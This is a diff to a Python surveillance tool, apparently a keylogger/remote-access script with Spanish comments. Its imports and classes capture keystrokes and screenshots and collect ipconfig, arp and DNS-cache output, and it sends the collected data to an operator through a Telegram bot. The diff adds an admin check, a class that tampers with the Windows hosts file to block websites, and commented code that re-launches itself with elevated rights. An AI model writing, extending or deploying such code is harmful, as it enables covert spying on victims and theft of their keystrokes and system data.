@@ -1,6 +1,6 @@
 # import libs
 import socket
-
+import ctypes, sys
 from pip._vendor import requests
 from pynput.keyboard import Listener  # Escucha eventos del teclado
 import os, os.path, platform, ctypes
@@ -13,7 +13,8 @@ import random  # Genera numeros
 import telepot  # Telegram API
 import string  # Lib genera textos
 import time  # Contar segundos
-
+import shutil
+from os import remove
 from PIL import ImageGrab  # Toma capturas de pantalla
 
 #region Config
@@ -40,7 +41,6 @@ class Config:
             self._NAME = "s5s6df45sdf456dsf4fds6fds"
             self.INTERVAL = 10  # seconds
 
-
 #endregion
 
 class Util:
@@ -58,6 +58,12 @@ class Util:
 
     def random_char(self, number=4):  # Genera letras aleatorias [Longitud según el argumento]
         return ''.join(random.choice(string.ascii_letters) for x in range(number))
+
+    def is_admin(self):
+        try:
+            return ctypes.windll.shell32.IsUserAnAdmin()
+        except:
+            return False
 
     def split_string(n, st):
         lst = ['']
@@ -328,7 +334,83 @@ class Key:
         with Listener(on_press=press) as listener:
             listener.join()
 
-class RedInformation:
+class WebsiteBlock:
+    def __init__(self):
+        self.hostsPath = r"C:\Windows\System32\drivers\etc\hosts"
+        self.pathListWeb = r"list websites.txt"
+        self.hostsTextOriginal = ""\
+        "# Copyright (c) 1993-2009 Microsoft Corp.\n"\
+        "#\n"\
+        "# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.\n"\
+        "#\n"\
+        "# This file contains the mappings of IP addresses to host names. Each\n"\
+        "# entry should be kept on an individual line. The IP address should\n"\
+        "# be placed in the first column followed by the corresponding host name.\n"\
+        "# The IP address and the host name should be separated by at least one\n"\
+        "# space.\n"\
+        "#\n"\
+        "# Additionally, comments (such as these) may be inserted on individual\n"\
+        "# lines or following the machine name denoted by a '#' symbol.\n"\
+        "#\n"\
+        "# For example:\n"\
+        "#\n"\
+        "#      102.54.94.97     rhino.acme.com          # source server\n"\
+        "#       38.25.63.10     x.acme.com              # x client host\n"\
+        "\n"\
+        "# localhost name resolution is handled within DNS itself.\n"\
+        "#	127.0.0.1       localhost\n"\
+        "#	::1             localhost"
+        self.listWebs = ["www.youtube.com",
+                         "www.wikipedia.com",
+                         "www.google.com",
+                         "www."
+                         ]
+
+        #self.hostsPath = r"test.txt"
+
+    def __read_file(self, path):
+        content = ""
+        file = open(path, "r")
+        for l in file.readlines():
+            content += l
+        file.close()
+        return content
+    def __write_file(self,path, text,split = True, type = "a"):
+        file = open(path, type)
+        try:
+            for t in text.split("\n"):
+                file.write("\n127.0.0.1    " + t) if split else file.write(t+"\n")
+        except:
+            print("Falló el split")
+            #file.write(text)
+        file.close()
+
+    def __rewrite_file(self,path, text):
+        self.__write_file(path, text, False, "w")
+    def __delete_file(self,path):
+        try:
+            remove(path)
+        except:
+            pass
+    """
+    def __backup(self,path1, path2):
+        try:
+            self.__delete_file(path1)
+            shutil.copy(path1, path2)
+            print("Backup - Sucess ")
+        except:
+            print("Backup - there was mistake error ")
+    """
+    def block(self):
+        #webs = self.__read_file(self.pathListWeb)
+        webs = self.listWebs
+        self.__write_file(self.hostsPath, webs)
+    def unlock(self):
+        self.__rewrite_file(self.hostsPath, self.hostsTextOriginal)
+    def reset(self):
+        self.unlock()
+
+class PCInformation:
     def __init__(self):
         pass
     def __display_dns(self):
@@ -341,20 +423,18 @@ class RedInformation:
 
     def __ip_config(self):
         response = ""
-        bot.sendChatAction(chat_id, 'typing')
         lines = os.popen('ipconfig /all')
         for line in lines:
             line.replace('\n\n', '\n')
             response += line
         return response
 
-        
-
     def __red_info(self):
         def internalIP():
             internal_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             internal_ip.connect(('google.com', 0))
             return internal_ip.getsockname()[0]
+
         response = ""
         lines = os.popen('arp -a -N ' + internalIP())
         for line in lines:
@@ -365,7 +445,7 @@ class RedInformation:
     def send(self):
         bot = telepot.Bot(Config.TelegramBot().TOKEN)
         chat_id = Config.TelegramBot().ID[0]
-        response = ''
+        response = ""
         bot.sendChatAction(chat_id, 'typing')
 
         responses = Util().split_string(4096, response)
@@ -374,59 +454,22 @@ class RedInformation:
 
 
 
-
-
-
-
-
-
-
 if __name__ == '__main__':
     #print("PATH Screenshot: " + Config().Screenshot().PATH) if Config().DEBUG else False
     #threading.Thread(target=StartUp().infinite).start()
     #threading.Thread(target=Key().listen_key).start() if Config().Keylogger().ACTIVE else False
     #threading.Thread(target=Screenshot().send).start() if Config().Screenshot().ACTIVE else False
-
-
-    bot = telepot.Bot(Config.TelegramBot().TOKEN)
-    chat_id = Config.TelegramBot().ID[0]
-    response = ''
-    #bot.sendChatAction(chat_id, 'typing')
-
-    # Indo DNS
-    """
-    bot.sendChatAction(chat_id, 'typing')
-    lines = os.popen('ipconfig /displaydns')
-    for line in lines:
-        line.replace('\n\n', '\n')
-        response += line
-
-    responses = split_string(4096, response)
-    for resp in responses:
-        bot.sendMessage(chat_id, resp)
-    """
-
-    """ # Usuario
-    bot.sendChatAction(chat_id, 'typing')
-    info = ''
-    for pc_info in platform.uname():
-        info += '\n' + pc_info
-    info += '\n' + 'Username: ' + "usuario"
-    response = info
-    """
-
+    pass
 
 
 
 
     """
-
-    responses = split_string(4096, response)
-    for resp in responses:
-        bot.sendMessage(chat_id, resp)
-
+    if is_admin():
+        # Code of your program here
+        print("ya eres admin prro")
+    else:
+        # Re-run the program with admin rights
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+        print("no sos admin pibe")
     """
-
-
-
-
